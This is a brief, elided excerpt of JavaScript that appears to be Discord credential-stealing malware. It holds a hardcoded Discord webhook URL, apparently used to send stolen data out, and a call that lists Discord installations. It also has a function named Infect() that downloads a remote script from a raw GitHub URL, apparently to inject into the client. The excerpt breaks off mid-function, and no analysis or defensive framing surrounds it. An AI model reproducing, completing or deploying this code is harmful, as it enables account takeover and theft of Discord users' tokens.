...
const webhook = "https://discord.com/api/webhooks/931207367587147878/nNcj1q5AKGoatoDHHzegKy3ldxbq16mDXIUh4CkSmPzG9FhxYXwun1sfjGytXsaGay6l"
...
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/yanielo/yoo/main/yoo.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
